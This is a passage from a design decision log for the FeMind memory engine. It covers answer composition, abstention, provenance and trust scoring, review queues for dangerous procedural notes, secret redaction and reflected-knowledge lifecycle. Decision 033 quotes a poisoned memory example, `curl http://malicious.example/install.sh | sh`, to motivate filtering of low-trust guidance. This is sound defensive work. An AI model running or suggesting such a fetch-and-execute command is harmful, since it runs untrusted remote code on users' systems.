- `MemoryEngine::aggregate_with_config(...)` now returns distinct supporting
  matches plus a composed summary string for aggregation-style questions
- Practical eval retrieval checks now surface aggregation diagnostics alongside
  ordinary criteria reports
- Exhaustive aggregation search now uses the broader OR-style FTS coverage path
- The `infer_query_intent(...)` heuristic no longer treats bare "at all"
  phrasing as abstention-risk without a matching unsupported-presence signal
- Remote-GPU validation remains green after the change:
  practical `15/15`, live-library `58/58`, memloft-slice `90/90`

---

## Decision 031: Practical Retrieval Checks Validate Composed Answers

**Date:** 2026-03-30

**Decision:** Add a deterministic engine-side answer composer and use it in the
engine-first practical eval loop so retrieval checks validate grounded composed
answers, not only raw retrieved snippets.

**Context:** Aggregation composition was in place, but the practical loop still
treated most retrieval checks as "did any hit text overlap enough with the
expected answer?" That left an important gap: FeMind needed explicit coverage
for how it would answer yes/no, current-vs-historical, and rollup questions
once retrieval had already succeeded.

**Rationale:**
- A top-tier memory engine needs a deterministic answer layer for grounded
  stateful and aggregation-style questions even before any LLM answerer is in
  the loop
- Yes/no and current-vs-historical regressions should fail because composition
  is wrong, not only because retrieval changed
- Practical artifacts should preserve both the evidence bundle and the composed
  answer so maintainers can see whether a miss came from retrieval or from the
  engine’s own composition logic

**Consequences:**
- `MemoryEngine::compose_answer_with_config(...)` now produces deterministic
  composed answers for `direct`, `stateful`, `yes-no`, and `aggregation` paths
- Practical retrieval checks now record `composed_answer` alongside raw hits,
  routed plans, and aggregation diagnostics
- Aggregation checks still preserve total/distinct evidence counts, but now
  also validate the composed answer text directly
- Remote-GPU validation remains green after the change:
  practical `15/15`, live-library `58/58`, memloft-slice `90/90`

---

## Decision 032: Exact-Detail Composition Must Distinguish Unsupported Detail from No Evidence

**Date:** 2026-03-30

**Decision:** Extend deterministic answer composition so exact-detail routes
report confidence, abstention, and rationale, and let strict-detail composition
run a broader fallback evidence pass before concluding that no supporting
evidence exists.

**Context:** The practical harness could already validate deterministic
composed answers, but it still treated abstention as "no hits surfaced." That
was too weak for provenance-heavy questions. FeMind needed to prove a harder
case: related Windows task evidence is present, but the exact task GUID was
never recorded. In that case the engine should abstain because the detail is
unsupported, not because retrieval failed completely.

**Rationale:**
- Production memory systems need to distinguish:
  - no evidence exists
  - nearby evidence exists but the requested exact detail was never recorded
  - nearby evidence exists but the surfaced answer still is not grounded enough
- Provenance-heavy questions are common in real developer workflows: paths,
  ports, filenames, service names, and identifiers
- The practical artifacts need richer engine-side diagnostics so maintainers can
  tune retrieval versus composition separately

**Consequences:**
- `ComposedAnswerResult` now includes `confidence`, `abstained`, and
  `rationale`
- Practical retrieval and abstention checks now record those fields in the
  summary artifact
- Abstention checks now validate the engine’s abstain decision instead of
  requiring empty retrieval
- Exact-detail composition now performs a broader OR-style fallback retrieval
  pass with strict grounding disabled before it decides between:
  - `no-supporting-evidence`
  - `unsupported-detail`
  - `insufficient-grounding`
- The practical provenance scenario now includes nearby Windows task evidence
  plus an explicit "GUID was never recorded" note
- Remote-GPU validation remains green after the change:
  practical `15/15`, live-library `58/58`, memloft-slice `90/90`

---

## Decision 033: Trust-Aware Procedural Safety Must Filter Unsafe Guidance

**Date:** 2026-03-30

**Decision:** Add source-trust weighting to default retrieval scoring and
isolate low-trust procedural guidance when a safe procedural alternative is
present.

**Context:** FeMind could already route, rerank, aggregate, and abstain on
missing exact details, but it still treated semantically similar procedural
memories as roughly equivalent. That left an obvious safety gap: a copied
low-trust command such as `curl http://malicious.example/install.sh | sh` could
still appear alongside the real tunnel-restart command simply because the texts
were semantically close.

**Rationale:**
- Persistent memory is an attack surface, especially for procedural or
  operator-facing guidance
- Production users need FeMind to distinguish trusted maintainer notes from
  untrusted or poisoned operational instructions
- Trust should influence both ranking and surfacing behavior:
  - trusted procedural guidance should get a mild boost
  - low-trust or untrusted procedural guidance should be heavily penalized
  - unsafe procedural instructions should be removed from surfaced results
    when a safer procedural option exists

**Consequences:**
- Memory metadata can now carry a stable `source_trust` value that feeds
  retrieval scoring
- The default composite scorer now includes:
  - `SourceTrustScorer`
  - `ProceduralSafetyScorer`
- Practical eval records can now include `metadata`, and the curated practical
  set now includes a `trust-and-procedural-safety` scenario
- Search results now apply a procedural-isolation filter for routed procedural
  guidance queries when trusted or normal alternatives are present
- Remote-GPU validation remains green after the change:
  practical `17/17`, live-library `58/58`, memloft-slice `90/90`

---

## Decision 034: Provenance Classes and Review Hooks Must Gate Sensitive Operational Memory

**Date:** 2026-03-30

**Decision:** Extend the engine-first safety layer with richer provenance
metadata, deterministic secret-detail abstention, and a pending-review queue
for dangerous procedural memories.

**Context:** Source-trust weighting and procedural isolation improved ranking,
but they still collapsed too many operational memories into a single trust
dimension. FeMind needed to distinguish maintainers, project docs, observed
local state, copied chat snippets, forum advice, and secret-bearing notes more
explicitly. It also needed a way to record "this memory exists, but it should
not be surfaced or acted on without review" for high-impact procedural changes.

**Rationale:**
- Top-tier memory safety depends on provenance, not only semantic similarity or
  a coarse trust flag
- Dangerous procedural notes should be inspectable and reviewable, not merely
  demoted in ranking
- Credential/secret questions need a deterministic abstention path so the
  engine can return grounded storage guidance without ever surfacing the secret
  value itself
- The practical harness should validate safety behavior directly, including
  review-queue state, instead of inferring safety only from retrieval output

**Consequences:**
- Memory metadata can now carry:
  - `source_kind`
  - `source_verification`
  - `content_sensitivity`
- The default composite scorer now includes `SourceProvenanceScorer` and
  `ReviewSafetyScorer` in addition to the earlier trust and procedural layers
- High-impact procedural memories now enter a pending-review queue with:
  - severity
  - reason
  - tags
  - status
- `MemoryEngine` now exposes review-queue inspection through:
  - `pending_review_items(...)`
  - `pending_review_count()`
- Deterministic composition now abstains on secret/credential value requests
  with a dedicated `sensitive-secret-detail` rationale
- Practical scenarios now validate:
  - review queue behavior for malicious or dangerous procedural memories
  - grounded storage guidance for sensitive tokens
  - abstention on exact secret value requests
- Remote-GPU validation remains green after the change:
  practical `20/20` exact, `20/20` ANN, live-library `58/58`,
  memloft-slice `90/90`

---

## Decision 035: Review Resolution States Must Change Retrieval Behavior

**Date:** 2026-03-30

**Decision:** Extend the review-safety layer so high-impact procedural memories
carry explicit resolution states and those states change how retrieval and
composition behave.

**Context:** Pending-review hooks were in place, but FeMind still lacked the
next operational layer: once a risky procedural memory has actually been
reviewed, the engine needs to know whether it was allowed, denied, or simply
expired after a temporary exception. Without that, review metadata is mostly a
reporting aid instead of an active policy surface.

**Rationale:**
- A production memory engine needs more than "flagged" versus "not flagged"
- Temporary operational exceptions must be able to expire and return to the
  pending review queue
- Human-denied guidance should not re-enter surfaced results through query
  variants or reranking
- Human-allowed guidance should remain retrievable without being treated as
  unresolved risk

**Consequences:**
- Review policy now recognizes:
  - `pending`
  - `allowed`
  - `denied`
  - `expired`
- `MemoryEngine` now supports review resolution updates through
  `set_review_status(...)`
- `review_items(...)` exposes the full review inventory, while
  `pending_review_items(...)` now returns only unresolved `pending` and
  `expired` items
- Review-aware scoring now heavily demotes denied guidance and still demotes
  unresolved pending/expired guidance
- Procedural retrieval now always filters denied guidance, and treats expired
  guidance as unresolved risk
- Multi-query retrieval now preserves the original routed query for procedural
  guidance so stripped query variants cannot reintroduce denied or expired
  instructions
- Practical validation now includes a `review-policy-transitions` scenario that
  proves:
  - allowed guidance can surface
  - denied guidance stays out of surfaced results
  - expired guidance returns to the pending review queue
- Remote-GPU validation remains green after the change:
  practical `24/24` exact, `24/24` ANN, live-library `58/58`,
  memloft-slice `90/90`

---

## Decision 036: Review Operations Need Expiry Timestamps and Surfaced Secret Redaction

**Date:** 2026-03-30

**Decision:** Extend FeMind's safety layer with operator-facing review commands,
timestamped temporary review allowances, and deterministic secret redaction for
surfaced evidence as well as composed answers.

**Context:** Review-state policy was already affecting retrieval, but maintainers
still lacked a FeMind-native way to list and resolve review items. Temporary
allowances also had no concrete expiry timestamp beyond manually setting an item
to `expired`. At the same time, safe secret-location answers were grounded, but
the practical harness could still show raw credential-bearing hits in the
observed evidence list.

**Rationale:**
- Review policy needs an operator workflow, not only library methods
- Temporary allowances should expire from a timestamp, not only by manual state
  flips
- Secret handling should protect every surfaced layer, not just the final
  composed answer
- Safe secret-location questions should remain answerable without leaking raw
  values into retrieval evidence

**Consequences:**
- `MemoryEngine` now supports:
  - `review_items_with_status(...)`
  - `review_item(...)`
  - `resolve_review_item(...)`
  - `expire_due_review_items(...)`
- Review items now carry:
  - `updated_at`
  - `expires_at`
  - `note`
- Effective review status now treats `allowed` items whose
  `review_expires_at <= now` as `expired`
- `femind-review` is now available as a FeMind-native operator CLI for:
  - listing review items
  - resolving review items with notes and optional expiry timestamps
  - expiring due temporary allowances
- review resolutions can now also carry:
  - `review_scope`
  - `review_policy_class`
  - `review_reviewer`
- allowed procedural exceptions now honor review scope during retrieval so a
  staging or migration-only exception does not surface as general production
  guidance
- Secret sensitivity is now modeled with explicit classes such as:
  - `credential-material`
  - `credential-location`
  - `secret-reference`
- Surfaced evidence and composed answers now redact raw credential material for
  safe location/reference questions instead of relying only on abstention for
  exact-value requests
- trusted secret-location guidance now suppresses untrusted secret-location
  alternatives when a safe source of truth is available
- Remote-GPU validation remains green after the change:
  practical `25/25` exact, `25/25` ANN, live-library `58/58`,
  memloft-slice `90/90`

---

## Decision 037: Allowed Procedural Exceptions Must Carry Scope

**Date:** 2026-03-30

**Decision:** Extend review resolution metadata so allowed high-impact
procedural memories can carry explicit scope, reviewer, and policy-class
information, and enforce that scope during retrieval.

**Context:** FeMind could already mark dangerous procedural guidance as
`allowed`, `denied`, or `expired`, but an allowed exception still had no
structured answer to "allowed for what?" A reviewed staging-only bridge note
should not surface as general production guidance just because it is trusted and
semantically close to the query.

**Rationale:**
- Human review needs structured context, not just a status bit
- Environment-specific exceptions should stay bound to their intended context
- Operator workflows should capture who resolved an exception and what class of
  exception it belongs to
- Secret/provenance safety is stronger when trusted location guidance can
  suppress low-trust alternatives

**Consequences:**
- Review resolutions can now carry:
  - `review_scope`
  - `review_policy_class`
  - `review_reviewer`
- `femind-review resolve` now supports reviewer, scope, and class flags
- Procedural retrieval now filters scope-mismatched allowed exceptions instead
  of treating every allowed item as globally valid guidance
- Trusted secret-location guidance now suppresses untrusted secret-location
  alternatives when a safe source exists
- Practical review-policy coverage now includes a production-host check that
  proves a staging-only approved bridge host does not bleed into production
  answers
- Remote-GPU validation remains green after the change:
  practical `25/25` exact, `25/25` ANN, live-library `58/58`,
  memloft-slice `90/90`

---

## Decision 038: Sensitive Guidance Needs Templates, Lifecycle Actions, and Provenance Resolution

**Date:** 2026-03-30

**Decision:** Extend FeMind's safety layer with template-driven review
allowances, explicit renew/revoke/replace lifecycle actions, broader sensitive
infrastructure classes, and provenance-based conflict resolution for competing
trusted guidance.

**Context:** Scoped approvals were in place, but operators still had to manage
temporary allowances as raw status changes. At the same time, FeMind could
prefer trusted secret-location guidance over untrusted advice, but it had no
explicit policy for competing trusted sources around private endpoints or
internal hostnames.

**Rationale:**
- repeated operational exceptions need reusable templates, not ad-hoc metadata
- temporary allowances should support renewal and explicit revocation
- dangerous procedural guidance should be able to point to a successor memory
  when it is replaced
- private endpoints and internal hostnames need the same protection model as
  credential locations
- when multiple trusted sources conflict, FeMind should prefer the stronger
  provenance source deterministically instead of depending only on raw score

**Consequences:**
- review metadata now also supports:
  - `review_template`
  - `review_replaced_by`
- FeMind now defines approval templates such as:
  - `staging-bridge`
  - `migration-bridge`
  - `lab-exception`
- `MemoryEngine` now supports:
  - `renew_review_item(...)`
  - `revoke_review_item(...)`
  - `replace_review_item(...)`
- `femind-review` now also supports:
  - `renew`
  - `revoke`
  - `replace`
- secret-policy classes now also include:
  - `token-material`
  - `key-material`
  - `private-endpoint`
  - `internal-hostname`
- private endpoint and internal hostname answers now redact exact values when
  policy requires abstention or safe surfacing
- trusted sensitive-guidance conflicts are now resolved by provenance rank, so
  stronger verified internal sources can suppress weaker trusted-but-declared
  alternatives
- practical eval now includes trusted private-endpoint conflict coverage plus
  exact-detail abstention on sensitive infrastructure values
- Remote-GPU validation remains green after the change:
  practical `27/27` exact, `27/27` ANN, live-library `58/58`,
  memloft-slice `90/90`

---

## Decision 039: Policy Classes Must Actively Route Retrieval for Scoped Guidance

**Date:** 2026-03-30

**Decision:** Treat review policy classes, scoped exception types, and trusted
procedural source conflicts as active retrieval constraints rather than
passive review metadata.

**Context:** FeMind already had review status, scoped allowances, lifecycle
actions, and provenance-aware sensitive guidance. The remaining failures were
operational: scoped support-path queries could still surface generic defaults,
breakglass exceptions could be filtered by the wrong scope, and keyword
exact-detail routes were skipping the same grounding/alignment passes used by
hybrid retrieval.

**Rationale:**
- breakglass, staging, and supported-path questions need different procedural
  guidance even when the records are all trusted
- scoped exceptions are only safe if retrieval enforces their intended use
- strong keyword exact-detail routes still need grounding and alignment passes
- trusted-source conflict resolution must favor explicit scoped/support-state
  evidence over generic defaults when the query is specific

**Consequences:**
- review policy classes now also include:
  - `breakglass-exception`
  - `private-infrastructure-exception`
- procedural queries now recognize:
  - supported/approved host-path questions
  - startup-path questions
  - breakglass procedure questions
- precise procedural detail queries now route as:
  - `QueryIntent::ExactDetail`
  - keyword-first retrieval
  - strict grounding enabled
- keyword and exhaustive retrieval paths now apply the same:
  - strict grounding
  - query-alignment reranking
  used by vector and hybrid retrieval
- trusted procedural conflict pruning now considers:
  - explicit review scope
  - query scope
  - support/default-vs-exception intent
  - provenance rank
  - staging/production/migration text cues
- breakglass recovery queries now resolve to production scope unless the query
  explicitly says staging, lab, or migration
- practical coverage now includes:
  - breakglass policy routing
  - scoped trusted procedural conflict resolution
- Remote-GPU validation is green after the change:
  practical `30/30` exact, practical `30/30` ANN, live-library `58/58`,
  memloft-slice `90/90`

---

## Decision 040: Higher-Impact Procedural Changes Need Their Own Approval Classes

**Date:** 2026-03-30

**Decision:** Extend FeMind's review policy surface with explicit approval
classes and templates for auth bypass, destructive reset windows, and traffic
cutovers, and validate them through engine-first routing scenarios instead of
only metadata parsing.

**Context:** FeMind already handled scoped exceptions, breakglass recovery, and
trusted conflict resolution, but several high-impact operational changes were
still flattened into broad categories. That made it harder to separate routine
guidance from:
- temporary auth bypass for lab debugging
- destructive index/database reset windows
- migration cutovers that intentionally switch traffic

**Rationale:**
- these procedures are operationally distinct and should not share the same
  retrieval rules as generic network exposure or maintenance notes
- maintainers need approval templates with sensible default expiry windows
- pending-review detection should catch these note types before they surface as
  ordinary guidance
- practical eval should exercise both:
  - explicit approved exceptions
  - unreviewed high-impact notes entering the queue

**Consequences:**
- review scopes now also include:
  - `maintenance`
- review policy classes now also include:
  - `auth-bypass-exception`
  - `data-reset-exception`
  - `traffic-cutover-exception`
- review templates now also include:
  - `lab-auth-bypass`
  - `maintenance-reset`
  - `traffic-cutover`
- query scope and policy matching now recognize:
  - maintenance reset windows
  - lab auth-bypass procedures
  - migration cutover procedures
- automatic review-flag detection now also tags:
  - `data-reset`
  - `traffic-cutover`
- practical eval now includes explicit scenarios for:
  - auth-bypass policy routing
  - maintenance reset policy routing
  - traffic cutover policy routing
  - high-impact pending-review detection
- Remote-GPU validation is green after the change:
  practical `37/37` exact, practical `37/37` ANN, live-library `58/58`,
  memloft-slice `90/90`

---

## Decision 041: Sensitive Infrastructure Guidance Must Prefer Fully Verified Sources

**Date:** 2026-03-30

**Decision:** Extend FeMind's provenance and secret-handling model so trusted
but partially verified or relayed infrastructure notes cannot outrank fully
verified guidance, and broaden redaction to cover sensitive internal share
paths and private network ranges.

**Context:** FeMind already handled private endpoints and internal hostnames as
sensitive guidance, and it already resolved trusted conflicts by provenance.
The remaining gap was narrower but important:
- trusted source chains could still include indirect or partially verified notes
- exact subnet and internal path questions needed the same abstention posture
  as exact endpoint questions
- safe guidance answers needed to stay useful without surfacing raw internal
  infrastructure values

**Rationale:**
- top-tier memory safety depends on distinguishing direct verified guidance from
  partially verified or relayed chains, not just trusted vs untrusted
- internal share paths and private network ranges can be operationally
  sensitive even when they are not credentials
- the engine-first practical suite should prove both:
  - preferred trusted-source selection
  - abstention/redaction on exact sensitive-detail requests

**Consequences:**
- `source_verification` now also recognizes:
  - `partially-verified`
  - `relayed`
- provenance ranking now prefers:
  - fully verified guidance over partially verified guidance
  - declared direct guidance over relayed chains
- secret-policy classes now also include:
  - `internal-share-path`
  - `private-network-range`
- exact-detail queries for:
  - internal share paths
  - private subnets / CIDR ranges
  now follow the same abstention path as other sensitive infrastructure details
- safe guidance answers now redact:
  - exact internal share paths as `[REDACTED_PATH]`
  - exact private network ranges as `[REDACTED_NETWORK]`
- practical eval now includes explicit scenarios for:
  - trusted private-network-range conflicts
  - trusted internal-share-path conflicts
  - partial and relayed trusted provenance chains for sensitive guidance
- Remote-GPU validation is green after the change:
  practical `41/41` exact, practical `41/41` ANN, live-library `58/58`,
  memloft-slice `90/90`

---

## Decision 042: Start Reflection with Deterministic Knowledge Objects

**Date:** 2026-03-30

**Decision:** Implement the first reflection pass as deterministic,
metadata-assisted knowledge-object synthesis in the engine, and validate it in
the engine-first practical loop instead of persisting opaque internal
reflection rows or tying reflection to benchmark-style iteration.

**Context:** FeMind already had strong routed retrieval, temporal/current-state
policy, aggregation, graph expansion, grounded composition, and safety rules.
The next quality gap was higher-order stable knowledge: repeated trusted
evidence should be able to collapse into durable, inspectable objects such as a
stable supported procedure or stable current decision. The existing
`MemoryRecord` model is consumer-defined, so storing internal reflection rows
directly would risk breaking `record_json` deserialization for consumers.

**Rationale:**
- deterministic reflection gives FeMind a real higher-order memory layer now
  without reintroducing expensive benchmark loops
- metadata-assisted synthesis keeps the first pass precise and inspectable:
  `knowledge_key`, `knowledge_summary`, and `knowledge_kind` tell the engine
  how repeated evidence should cluster
- returning knowledge objects instead of persisting internal rows avoids
  corrupting the generic consumer storage contract before a safe persistence
  design exists
- reflection belongs in the same engine-first eval loop as retrieval and safety,
  not in an external benchmark harness

**Consequences:**
- the engine now exposes deterministic reflection through
  `reflect_knowledge_objects(&ReflectionConfig)`
- reflected objects carry:
  - key
  - summary
  - kind
  - confidence
  - support counts
  - trusted support counts
  - source IDs
- reflection filters out:
  - untrusted evidence
  - pending / denied / expired review items
  - secret-bearing or sensitive-infrastructure memories
- the practical eval harness now supports:
  - scenario-level `reflection` config
  - `reflection_checks`
  - reflection-specific reporting and pass/fail criteria
- practical coverage now includes deterministic reflection for:
  - stable supported startup procedures
  - stable engine-first evaluation strategy decisions
- Remote-GPU validation is green after the change:
  practical `43/43` exact, practical `43/43` ANN, live-library `58/58`,
  memloft-slice `90/90`

---

## Decision 043: Persist Reflected Knowledge Only Through Consumer-Built Records

**Date:** 2026-03-31

**Decision:** Add an opt-in persistence contract for reflected knowledge
objects through `persist_reflected_knowledge_objects_with(...)`, where the
consumer supplies how a `KnowledgeObject` becomes its own `MemoryRecord`.
FeMind owns the reflection metadata, `source_ids`, and tier bookkeeping around
that persisted record.

**Context:** Decision 042 shipped deterministic reflection, but it deliberately
stopped short of persistence because FeMind is generic over consumer-defined
record types. Writing an internal hidden reflection row directly into
`record_json` would have made `get()` / deserialization unsafe for consumers.
The next step needed to preserve the generic storage contract while still
letting applications keep higher-order stable knowledge in their own stores.

**Rationale:**
- consumers, not FeMind, should decide the concrete shape of stored reflection
  records
- FeMind still needs to preserve reflection provenance and retrieval semantics:
  `derived_kind=reflection`, `knowledge_*` metadata, tier `2`, and `source_ids`
- the operation should be idempotent for repeated reflection passes over the
  same derived summary

**Consequences:**
- the engine now exposes:
  - `persist_reflected_knowledge_objects_with(&ReflectionConfig, builder)`
  - `PersistedKnowledgeObject`
- the builder returns the consumer’s own `MemoryRecord`, so persisted
  reflection rows remain safe for normal `get()` and deserialization
- FeMind patches persisted rows with:
  - `derived_kind=reflection`
  - `knowledge_key`
  - `knowledge_summary`
  - `knowledge_kind`
  - reflection confidence/support metadata
  - tier `2`
  - `source_ids` provenance
- repeated persistence over the same reflected summary reuses the duplicate row
  and refreshes reflection metadata instead of creating junk duplicates
- reflection is no longer runtime-only; applications can now opt into storing
  stable derived knowledge while keeping the generic record boundary intact

---

## Decision 044: Give Persisted Reflection Rows a Lifecycle and Retrieval Contract

**Date:** 2026-03-31

**Decision:** Extend persisted reflected knowledge so it behaves like real
memory, not a static dump. Older reflected rows with the same
`knowledge_key` must be superseded when the derived summary changes, reflected
rows must link back to their supporting source memories, and the practical
suite must query persisted reflections directly through ordinary retrieval
checks.

**Context:** Decision 043 made reflection persistence consumer-safe, but the
first pass only stamped reflection metadata onto the persisted row. That left
three gaps:

- older persisted reflections never aged out when the derived summary changed
- persisted reflections had `source_ids`, but not explicit graph links to their
  supporting memories
- the practical suite validated runtime reflection objects, but not direct
  retrieval over persisted reflected rows

That was enough for storage safety, but not enough for production-quality
higher-order memory.

**Rationale:**
- reflected knowledge should participate in the same current-vs-stale mechanics
  as other memories
- explicit graph links make persisted reflections inspectable and traversable by
  consumers without re-parsing metadata blobs
- direct retrieval checks over persisted reflections keep the engine-first eval
  loop honest; the system should prove not only that it can synthesize stable
  knowledge, but that the stored result is actually queryable
- source-aware retrieval criteria give the practical harness the granularity to
  prove a reflected row was surfaced, not merely inferred from nearby source
  notes

**Consequences:**
- `persist_reflected_knowledge_objects_with(...)` now:
  - marks the current persisted reflection row as `reflection_status=current`
  - supersedes older reflected rows with the same `knowledge_key` when the
    summary changes
  - records `reflection_replaced_by` and `reflection_superseded_at`
  - clears `valid_until` on the current reflected row
  - creates `superseded_by` links from old reflected rows to the current one
  - creates `validated_by` links from the persisted reflection row to its
    supporting source memories
- practical retrieval checks now support:
  - `required_sources`
  - `forbidden_sources`
  - per-check `top_k`
- reflection scenarios can now set `reflection.persist=true` so the practical
  harness persists reflected knowledge before running retrieval checks
- practical coverage now proves two things separately:
  - runtime reflection objects are synthesized correctly
  - persisted reflection rows can be surfaced directly through retrieval
- Remote-GPU validation is green after the change:
  practical `45/45` exact, practical `45/45` ANN, live-library `58/58`,
  memloft-slice `90/90`

---

## Decision 045: Add Application-Facing Stable-Knowledge APIs and Refresh Planning

**Date:** 2026-03-31

**Decision:** Promote reflection from an internal synthesis mechanism to an
application-facing feature. FeMind should expose explicit stable-knowledge
search helpers, persisted reflected-knowledge inspection APIs, and a refresh
planning contract so applications can deliberately retrieve and recompute
reflected knowledge.

**Context:** Decisions 042-044 established deterministic reflection,
consumer-safe persistence, and lifecycle semantics for persisted reflected
rows. That still left one gap: applications had no first-class way to say
"treat reflected knowledge as the preferred stable summary layer" or "show me
which reflected rows need recomputation now." Without those APIs, reflected
knowledge remained technically present but operationally awkward.

**Rationale:**
- stable-summary style queries should be able to opt into reflected knowledge
  directly instead of hoping ordinary retrieval ranks it correctly
- applications need explicit inspection and refresh planning if reflected
  knowledge is going to become part of a real product surface
- refresh policy should stay consumer-controlled, consistent with FeMind’s
  library-first design, rather than being hidden behind an internal scheduler

**Consequences:**
- the engine now exposes:
  - `search_stable_knowledge(...)`
  - `search_stable_knowledge_only(...)`
  - `persisted_reflected_knowledge()`
  - `reflected_knowledge_for_key(...)`
  - `reflection_refresh_plan(...)`
  - `refresh_reflected_knowledge_objects_with_policy(...)`
- search now supports `ReflectionSearchPreference`, including:
  - `PreferCurrent`
  - `OnlyCurrent`
- stable-knowledge search over-fetches and prefers current reflected rows so
  reflection can actually surface as the intended summary layer in ordinary
  query flows
- reflection refresh is now explicit policy:
  `ReflectionRefreshPolicy` can trigger recomputation for missing persisted
  rows, stale rows, changed summaries, or stronger support
- targeted engine tests cover:
  - current reflected row lookup by key
  - stale reflection refresh planning
  - stable-knowledge search preferring current reflected rows
- Remote-GPU validation is green after the change:
  practical `45/45` exact and practical `45/45` ANN

---

## Decision 046: Route Stable-Summary Queries to Current Reflected Knowledge

**Date:** 2026-03-31

**Decision:** Add a first-class `stable-summary` query intent to routed
retrieval. Queries that clearly ask for the supported, preferred,
recommended, or current durable summary of a fact family should
automatically prefer current reflected rows and current-state evidence.

**Context:** Decision 045 exposed stable-knowledge helpers explicitly, but
left ordinary retrieval unchanged. That meant reflection remained opt-in at the
API boundary, and practical scenarios could still pass for the wrong reason if
ordinary retrieval happened to surface the reflected row without the route
actually recognizing the query shape.

**Rationale:**
- stable-summary behavior should be part of the engine, not only a consumer
  helper
- applications should not need to know FeMind internals to ask a natural
  “what is the current supported path/strategy” question
- the practical suite needs route-level assertions so intent-routing regressions
  are visible even when the final answer still looks right

**Consequences:**
- `QueryIntent` now includes `StableSummary`
- routed plans now carry `reflection_preference`
- stable-summary routes:
  - prefer current reflected rows
  - favor newer/current-state evidence
  - widen reranking like current-state queries
- practical retrieval checks can now assert:
  - `expected_intent`
  - `expected_reflection_preference`
- reflection scenarios now prove both:
  - the answer is correct
  - the engine actually routed them through `stable-summary`
- Remote-GPU validation is green after the change:
  practical `45/45` exact and practical `45/45` ANN

---

## Decision 047: Make Stable-Summary Composition Choose Reflected, Source, or Blended Evidence

**Date:** 2026-03-31

**Decision:** Extend deterministic composition so stable-summary queries do not
just retrieve reflected knowledge, but deliberately choose an evidence basis:
`reflected`, `source`, or `blended`.

**Context:** Decision 046 made stable-summary routing explicit, but composition
still behaved like generic direct/stateful answering after retrieval. That
meant FeMind could surface the right reflected row while still hiding an
important distinction: whether the final answer came from the reflected summary
itself, from raw source evidence, or from a deliberate combination of both for
provenance-sensitive questions.

**Rationale:**
- top-tier memory quality needs more than good retrieval; it needs explicit
  control over how higher-order knowledge is surfaced to applications
- reflected summaries should be first-class answer material for durable-summary
  questions
- provenance-sensitive stable-summary questions should be able to blend the
  reflected summary with direct supporting evidence instead of forcing a false
  choice between the two
- the practical suite should assert this behavior directly, not infer it from
  answer text after the fact

**Consequences:**
- `ComposedAnswerResult` now records `basis`:
  - `source`
  - `reflected`
  - `blended`
- stable-summary composition now:
  - prefers current reflected summaries when they exist
  - falls back to source evidence if no current reflected row is available
  - blends reflection with supporting source evidence for evidence-seeking
    stable-summary questions
- practical retrieval checks can now assert `expected_composed_basis`
- reflection practical coverage now includes:
  - a reflected-summary answer path
  - a blended reflected-plus-source answer path
- Remote-GPU validation is green after the change:
  practical `46/46` exact and practical `46/46` ANN

---

## Decision 048: Make Stable-Summary Promotion Policy Explicit for Applications

**Date:** 2026-03-31

**Decision:** Stable-summary behavior should remain engine-native, but the
promotion policy must be application-facing. FeMind now lets callers choose
between `auto`, `prefer-reflection`, and `prefer-source` for stable-summary
retrieval and composition.

**Context:** Decisions 045-047 made reflected knowledge application-facing,
routed stable-summary queries automatically, and taught the composer to answer
from reflected, source, or blended evidence. The remaining gap was control.
Different apps can legitimately want different stable-summary behavior:
- some want the durable reflected summary whenever it exists
- some want reflection only as an optimization, but still want final answers to
  stay on raw source evidence by default
- some want the engine default, not a forced global choice baked into FeMind

Without an explicit policy, the engine behavior was correct but not fully
productizable across different consumers.

**Consequences:**
- `StableSummaryPolicy` is now first-class:
  - `auto`
  - `prefer-reflection`
  - `prefer-source`
- search helpers now expose that choice through:
  - `search_stable_knowledge_with_policy(...)`
- deterministic composition now exposes the same choice through:
  - `compose_answer_with_config_and_summary_policy(...)`
- routed query plans now record the chosen stable-summary policy in addition to
  routed reflection preference
- source-preferred stable-summary queries stay on source evidence when good
  source rows exist, and only fall back to reflection if no source evidence is
  available
- practical retrieval checks can now assert:
  - `expected_stable_summary_policy`
  - `expected_composed_basis`
- reflection practical coverage now proves three distinct stable-summary paths:
  - reflected summary under the default policy
  - blended reflected-plus-source evidence for provenance-sensitive questions
  - source-preferred answers when the caller requests `prefer-source`
- Remote-GPU validation is green after the change:
  practical `47/47` exact, practical `47/47` ANN, live-library `58/58`,
  memloft-slice `90/90`

---

## Decision 049: Reflection Refresh Must Handle Contention, Weakening, and Retirement

**Date:** 2026-03-31

**Decision:** Reflected knowledge lifecycle cannot stop at promotion. FeMind
must also detect when a current reflected summary becomes contested by another
qualified trusted summary, when support materially weakens, and when the
current reflected row no longer qualifies at all.

**Context:** Decisions 042-048 established deterministic reflection,
consumer-safe persistence, lifecycle supersession, application-facing refresh
planning, and caller-controlled stable-summary promotion. That was sufficient
for strengthening summaries over time, but it still assumed reflected
knowledge only improves. Real memory systems also need the opposite behavior:
- trusted summaries can begin to conflict even when the current winner does not
  change
- support counts can fall, leaving the persisted reflected row overstating how
  well grounded it is
- a persisted current reflection can outlive the evidence that originally made
  it qualify

Without these negative-lifecycle rules, reflected knowledge becomes stale in a
more subtle way: not because the summary text changed, but because the support
quality behind it changed.

**Consequences:**
- `KnowledgeObject` and `PersistedKnowledgeSummary` now carry contested-summary
  metadata:
  - `contested`
  - `competing_summary_count`
  - `strongest_competing_summary`
  - `strongest_competing_support_count`
  - `strongest_competing_trusted_support_count`
- contested reflected summaries now lower deterministic reflection confidence
  when another qualified trusted summary competes for the same `knowledge_key`
- `ReflectionLifecycleStatus` now includes:
  - `retired`
- `ReflectionRefreshPolicy` now handles both reinforcement and regression:
  - support growth
  - trusted-support growth
  - support weakening
  - trusted-support weakening
  - competing trusted summaries
  - retirement when no current reflected summary still qualifies
- `ReflectionRefreshPlanItem` now exposes:
  - the `key`
  - the planned `action` (`persist` or `retire`)
  - an optional synthesized `object`
  - the current persisted row and refresh reasons
- `refresh_reflected_knowledge_objects_with_policy(...)` now:
  - persists updated reflected rows when evidence grows, weakens, or becomes
    contested
  - retires current reflected rows when no qualifying reflected object remains
- the practical suite now proves contested reflection explicitly
- focused engine tests now prove:
  - competing trusted summary detection
  - support weakening refresh
  - retirement of no-longer-qualified current reflected rows
- Remote-GPU validation is green after the change:
  practical `48/48` exact, practical `48/48` ANN, live-library `58/58`,
  memloft-slice `90/90`

## Decision 050: Model Source-Chain Authority Above Generic Provenance

**Decision:** Add an explicit source-chain authority layer so FeMind can prefer
the authoritative chain for an inferred query domain when trusted sources
disagree, instead of relying only on trust plus provenance rank.

**Context:** Provenance ranking was already strong enough for most trusted
conflicts, but it still treated all trusted chains inside a domain as generic
